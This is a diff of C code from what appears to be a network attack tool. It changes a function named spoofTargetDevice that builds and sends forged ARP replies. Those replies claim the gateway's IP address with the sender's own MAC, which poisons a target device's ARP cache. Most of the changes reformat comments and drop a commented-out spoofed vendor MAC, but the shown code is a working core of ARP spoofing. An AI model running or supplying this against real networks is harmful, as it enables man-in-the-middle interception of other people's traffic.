@@ -6,15 +6,16 @@ void spoofTargetDevice(netDevices **targetDevice, wirelessInterface *WI) {
   etherHeader frameHeader;
   arpIPv4packet ARPData;
   int nsent = 0;
-  /*
-   *  Construct Ethernet frame header
+
+  /**
+   * Construct Ethernet frame header
    */
-  // unsigned char spoofedMAC[ETH_ALEN] = {0x00, 0x03, 0xfe, 0x54, 0xac, 0x13}; // Cisco Systems, Inc.
   memcpy(frameHeader.destMAC, (*targetDevice)->MAC, ETH_ALEN);
   memcpy(frameHeader.srcMAC, WI->MAC, ETH_ALEN);
   frameHeader.type = htons(DEFAULT_ETHER_PRO);
-  /*
-   *  Construct the ARP Header.
+
+  /**
+   * Construct the ARP Header.
    */
   memset(&ARPData, '\0', sizeof(arpIPv4packet));
   ARPData.htype = htons(DEFAULT_ARP_HTYPE);
@@ -26,11 +27,12 @@ void spoofTargetDevice(netDevices **targetDevice, wirelessInterface *WI) {
 
   memcpy(ARPData.tha, (*targetDevice)->MAC, ETH_ALEN);
 
-
-  ARPData.spa = WI->gatewayAddress; // sourse ip address
+  /**
+   * Sourse ip address.
+   */
+  ARPData.spa = WI->gatewayAddress;
   ARPData.tpa = (*targetDevice)->address;
   
-
   packageARP(ARPBuffer, &frameHeader, &ARPData, &ARPBufferLength);
  
   nsent = pcap_sendpacket(pcapARPHandler, ARPBuffer, ARPBufferLength);
